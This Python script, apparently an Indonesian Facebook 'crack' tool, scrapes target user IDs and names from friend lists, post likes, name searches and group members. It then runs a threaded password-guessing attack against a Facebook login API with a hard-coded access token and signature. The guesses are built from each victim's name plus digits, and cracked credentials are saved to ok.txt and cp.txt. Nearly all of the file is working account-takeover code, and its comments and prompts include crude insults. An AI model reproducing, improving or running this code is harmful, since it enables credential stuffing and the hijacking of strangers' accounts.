#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#Males gw encrypt Tod jika mau recode, recode aja
#Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
#Code by YayanXD 
#Created 05-07-2020
#My facebook (https://www.facebook.com/KM39453)

import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def croot():
    os.system("git pull")
def ikeh_ikeh_kimochi():
    os.system("clear")
def aahh(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def kontol():
    time.sleep(0.3)
    print("""\n\x1b[1;91m      █████████████████████╗
      █████████████████████║
\x1b[1;97m      █████████████████████║
      █████████████████████║
         ╚═════════════════╝
\x1b[1;91m  ❀\x1b[1;93m❀\x1b[1;92m❀\x1b[1;97m ────────paler──────── \x1b[1;92m ❀\x1b[1;93m❀\x1b[1;91m❀ 
print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP) 
\x1b[1;93m────────────────────────────────────────────────────
\x1b[1;91mAuthor   : YayanXD
\x1b[1;91mrecode  : ehan
\x1b[1;93m────────────────────────────────────────────────────""")
def jembut():
    print("""\n\x1b[1;91m  █████████████████████
  █████████████████████
\x1b[1;97m  █████████████████████
  █████████████████████
\x1b[1;91m  ❀\x1b[1;93m❀\x1b[1;92m❀\x1b[1;97m ────────paler──────── \x1b[1;92m ❀\x1b[1;93m❀\x1b[1;91m❀      
\x1b[1;93m────────────────────────────────────────────────────
\x1b[1;91mAuthor   : YayanXD
\x1b[1;91mrecode  : ehan
\x1b[1;93m────────────────────────────────────────────────────""")

def yayanxd():
    yayan=input("\n\033[00m\t   [\033[96m enter aja\033[97m ] ")
    if yayan == "": 
       os.system("python Haram5.py")
    else:
       sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
def moch_yayan():
    time.sleep(0.1)
    print("\033[97m [\033[96m01\033[97m] lanjut")
    print("\033[97m [\033[96m02\033[97m] Update Tools")
    print("\033[97m [\033[91m00\033[97m] Exit")
    print("\x1b[1;94m────────────────────────────────────────────────────")
    time.sleep(0.1)

    yayan=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
    if yayan == "1" or yayan =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                   ikeh_ikeh_kimochi()
                   kontol()
                   cek = input("\n\033[0;92m       [ \033[0;97mtool ini menggunakan Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
                   print('\n\033[97m [\033[92m+\033[97m] \033[92mtunggu ya bang.....')
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
             else:
                  os.system("") 
                  os.system('rm -rf cookies')
                  print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                  os.system('python Cr4ck.py')
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('ok.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('cp.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProcess Of Retrieving ID... ",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] link tidak ada!")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   ikeh_ikeh_kimochi()
                   kontol()
                   aahh('\033[1;97m [\033[1;92m01\033[1;92m] CRACK DARI ID TEMAN')
                   aahh('\033[1;97m [\033[1;92m02\033[1;93m] CRACK DARI LINK POSTING')
                   aahh('\033[1;97m [\033[1;92m03\033[1;94m] CRACK DARI CARI NAMA')
                   aahh('\033[1;97m [\033[1;92m04\033[1;95m] CARCK DARI ID GRUP')
                   aahh('\033[1;97m [\033[1;92m05\033[1;96m] CRACK DARI ID PUBLIK')
                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] LIAT HASIL CRACK')
                   aahh('\033[1;97m [\033[1;92m07\033[1;98m] HAPUS COOKIES')
                   aahh('\033[1;97m [\033[1;91m00\033[1;99m] KELUAR')
                   print('\x1b[1;93m────────────────────────────────────────────────────')
                   memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                   if memek =="":
                         print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                         yayanxd()
                   elif memek == '0' or memek =='00':
                         aahh("\n\033[1;92m ntar balik lagi yaa...\n\n")
                         os.system('')
                         exit()                   	
                   elif memek == '7' or memek =='07':
                         print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mmohhon tunggu... ")
                         aahh("\x1b[1;92m • 10")
                         aahh("\x1b[1;93m •• 20")
                         aahh("\x1b[1;94m ••• 30")
                         aahh("\x1b[1;95m •••• 40")
                         aahh("\x1b[1;96m ••••• 50")
                         aahh("\x1b[1;97m •••••• 60")
                         aahh("\x1b[1;92m ••••••• 70")
                         aahh("\x1b[1;91m •••••••• 80")
                         aahh("\x1b[1;96m ••••••••• 90")
                         aahh("\x1b[1;94m •••••••••• 100%")
                         os.system("rm -rf cookies")
                         print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                         yayanxd()
                   elif memek == '1' or memek =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif memek == '2' or memek =='02':
                         username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'www.facebook' in username:
                                 username = username.replace('m.facebook','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif memek == '3' or memek =='03':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] CARI NAMA TEMAN\033[1;91m: \033[1;92m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[90m] No Name!")
                   elif memek == '4' or memek =='04':
                         print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                         grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m] Group ID None!")
                   elif memek == '5' or memek =='05':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
                   elif memek == '6' or memek =='06':
                         try:
                                 file1 = open("cp.txt").read()
                                 file2 = open("ok.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] untuk memeriksa akun")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 for x in result:
                                         with open('ok.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('cp.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] crack selesai....")
                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] simpan \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                         except FileNotFoundError:
                                 exit("\n\033[00m[\033[91m!\033[00m] yahahaha gk dapat")
                   else:
                         print("\n\n \033[00m[\033[91m!\033[00m] cari yang lain goblok!")
                         yayanxd()
                   print()
                   ikeh_ikeh_kimochi()
                   jembut()
                   print('\n\x1b[1;96m         ✰─────────sabar────────✰')
                   print('\x1b[1;95m           ✰─────────────────────✰')
                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     ──────────────────────\n",end="")       
                   expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
                   aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
                   ikeh_ikeh_kimochi()
                   jembut()
                   print('\n\x1b[1;92m        ✰─────────sabar────────✰')
                   print('\x1b[1;97m           ✰─────────────────────✰')
                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     ──────────────────────\n",end="")
                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  str(x) + '123456',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\x1b[1;97m finished.")
     
                   else:
                           print("\n\n\x1b[1;96m  *\x1b[1;97m you got no results:(")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")

    elif yayan == "2" or yayan =="02":
         print("\n\n\x1b[1;97m      [ \x1b[1;92mtunggu aja lagi update \x1b[1;97m]\n")
         os.system("git pull")
         print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m sukses update")
         yayanxd()
    elif yayan == "3" or yayan =="03":
         os.system('')
         yayanxd()
    elif yayan == "4" or yayan =="04":
         os.system('')
         yayanxd()
    elif yayan == "0" or yayan =="00":
         aahh("\n\033[1;92m pergi sana lu anjing\n\n")
         os.system('')
         exit()                   	

if __name__=="__main__":
     ikeh_ikeh_kimochi()
     croot()
     ikeh_ikeh_kimochi()
     kontol()
     moch_yayan()
     yayanxd()

